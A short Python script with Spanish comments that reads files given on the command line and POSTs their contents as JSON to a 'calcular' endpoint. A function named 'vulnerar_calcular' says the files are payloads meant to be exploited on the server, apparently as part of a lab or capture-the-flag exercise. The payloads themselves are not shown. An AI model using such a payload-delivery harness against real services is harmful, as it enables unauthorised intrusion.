import json, sys, os
import requests
from constants import CALCULAR_ENDPOINT


def quitar_extension(archivo):
    """Retorna el nombre del archivo sin la extensión de tipo de archivo"""
    return os.path.splitext(archivo)[0]

def cargar_diccionarios(archivos: list[str], sin_extensiones:bool=True):
    """
        Pasado un listado de archivos, crea un diccionario con el formato:
        {
            nombre_archivo1: contenido_archivo1,
            nombre_archivo2: contenido_archivo2,
            ...
        } 
    """
    d = {(quitar_extension(archivo) if sin_extensiones else archivo): "" for archivo in archivos}
    for archivo in archivos:
        try:
            # Carga de contenido en d
            with open(archivo, 'r') as f:
                contenido = f.read()
                nombre = quitar_extension(archivo) if sin_extensiones else archivo
                d[nombre] = contenido
        except FileNotFoundError:
            print(f"Error: No se encontró el archivo {archivo}")
            return None
        except IOError:
            print(f"Error: No se pudo leer el archivo {archivo}")
            return None
    return d

def parsear_archivo(archivos: list[str], sin_extensiones:bool=True) -> str | None:
    """
    Pasado un listado de paths de archivos, convierte al contenido en un json con el formato
        {
            nombre_archivo1: contenido_parseado1,
            nombre_archivo2: contenido_parseado2,
            ...
        }
    """
    d: dict[str, str] = cargar_diccionarios(archivos, sin_extensiones)
    try:
        # parseo de todo el contenido de d
        return json.dumps(d,  separators=(':', ','))
    except Exception as e:
        print(f"Error al convertir a JSON: {e}")
        return None

def vulnerar_calcular(json_vulnerable: str | dict):
    """
        Envia el diccionario con los payloads al servidor para que sean explotados
    """
    print("Realizando envio de archivos al servidor...")
    try:
        res = requests.post(CALCULAR_ENDPOINT, json=json_vulnerable)
    except Exception as e:
        print(f"Ocurrio un error al intentar enviar el request al servidor: {e}")
        
    print(res.text)
    
    
_, *archivos = sys.argv

# me llevo solo los archivos que existen
archivos = [archivo for archivo in archivos if (os.path.exists(archivo))]

# genero_json_salida
d = cargar_diccionarios(archivos)

if d:
    vulnerar_calcular(d)